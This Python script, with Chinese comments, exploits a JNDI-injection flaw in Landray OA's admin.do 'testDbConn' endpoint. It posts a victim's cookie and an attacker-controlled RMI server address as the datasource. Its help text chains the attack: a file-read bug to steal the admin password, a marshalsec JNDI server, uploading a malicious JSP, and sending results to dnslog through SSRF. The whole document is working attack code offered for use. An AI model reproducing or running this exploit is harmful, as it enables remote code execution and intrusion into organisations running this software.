import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='在使用该漏洞前请使用蓝凌OA 任意文件读取漏洞来获取密码来登录到后台获取cookie，还要有开启rmi服务的网站地址，通过攻击网站来上传恶意的jsp文件，然后通过ssrf来把请求的内容发送到dnslog上，可以使用marshalsec工具（https://github.com/mbechler/marshalsec）构建一个JNDI服务',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')
parser.add_argument('-c', '--cookie', type=str, help='输入登录后cookie')
parser.add_argument('-d', '--datasource', type=str, help='你开启的rmi服务器地址')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/admin.do"  # 移除末尾的斜杠
    else:
        url = args.url + "/admin.do"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
    'Cookie': args.cookie,
    'Content-Length': '70',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
}

data = {
    'method': 'testDbConn',
    'datasource': args.datasource
}

response = requests.post(url, headers=headers, data=data)
if response.status_code == 200:
    print("目标url："+ url + '\n' +"访问存放的恶意成功\n")
    print(response.text)
else:
    print("目标url："+ url + '\n' +"不存在漏洞，或者网站未开启rmi服务")
# print(response.text)
